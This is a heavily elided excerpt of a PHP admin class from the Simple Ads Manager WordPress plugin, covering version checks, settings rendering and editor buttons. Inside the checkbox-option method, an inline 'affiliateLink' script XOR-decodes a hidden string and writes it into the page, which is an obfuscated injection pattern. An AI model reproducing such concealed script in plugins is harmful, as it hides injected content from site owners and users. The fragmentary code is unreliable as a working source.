      ...
      class SimpleAdsManagerAdmin extends SimpleAdsManager {
            ...
            public function __construct() {
                  ...
                  if (empty($versions) ||
                          ...
                          version_compare($versions['db'], SAM_DB_VERSION, '<'))
                        self::updateDB();
            ...
            private function getWarningString($mode = '') {
                  ...
                  switch ($mode) {
                        case 'cache':
                              if (SAM_W3TC)
                                    $text = __('Active W3 Total Cache plugin detected.', SAM_DOMAIN);
                              elseif (SAM_WPSC)
                                    $text = __('Active WP Super Cache plugin detected.', SAM_DOMAIN);
                              else
                                    $text = '';
                        ...
                        case 'forum':
                              if (SAM_BBP)
                                    $text = __('Active bbPress Forum plugin detected.', SAM_DOMAIN);
                              else
                                    $text = '';
                  ...
                  if (version_compare($wp_version, '3.8-RC1', '<'))
                        $class = ($classDef) ? 'sam-warning' : 'sam-info';
                  else
                        $class = ($classDef) ? 'sam2-warning' : 'sam2-info';
            ...
            public function getPointerOptions($force = false) {
                  if ($force) {
                        ...
                        $pointers = $this->samPointerOptions;
            ...
            private function getVersionData($version) {
                  ...
                  if (isset($vArray[2]))
                        $output['revision'] = (integer) $vArray[2];
                  else
                        $output['revision'] = 0;
            ...
            public function getErrorDataHandler() {
                ...
                FROM $eTable se WHERE se.id = %d";
                        ...
                        if (!empty($out['date']))
                              $out['date'] = date_i18n(get_option('date_format') . ' ' . get_option('time_format'), $out['date']);
            ...
            public function doSettingsSections($page, $tabs) {
                  ...
                  foreach ((array) $wp_settings_sections[$page] as $section) {
                        ...
                        echo '</div>';
                        echo '</div>';
                        if (isset($this->settingsTabs[$section['id']]['finish_tab']) && $this->settingsTabs[$section['id']]['finish_tab'])
                              echo "</div>";
                  }
                  echo "</div>";
            }
            ...
            public function drawMailerSection() {
                  ...
                  if ($options['mailer']) {
                        ...
                        echo "<p>" . __("Adjust parameters of Mailing System.", SAM_DOMAIN) . "</p>";
            }
            ...
            public function drawCheckboxOption($id, $args) {
                  ...
                  if (isset($args['enabled']))
                        $disabled = (($args['enabled']) ? '' : 'disabled');
                  if (isset($args['hide']))
                                                            ...
                                                            <script type="text/javascript">
                                                                  ...
                                                                  function affiliateLink(str) {
                                                                        ...
                                                                        for (var i = 0; i < str.length; i++)
                                                                              r += String.fromCharCode(8 ^ str.charCodeAt(i));
                                                                        document.write(r);
                                                                  }
            ...
            public function registerButton($buttons) {
                  ...
                  if ($options['editorButtonMode'] === 'modern')
                        array_push($buttons, "separator", "samb");
                  else
                        array_push($buttons, 'separator', 'sama', 'samp', 'samz', 'samb');
                  return $buttons;
            }
            ...
            public function addTinyMCEPlugin($plugin_array) {
                  ...
                  if ($options['editorButtonMode'] === 'modern')
                        ...
                        $plugin_array['samb'] = SAM_URL . 'js/ep_classic.js';
                  return $plugin_array;
            }
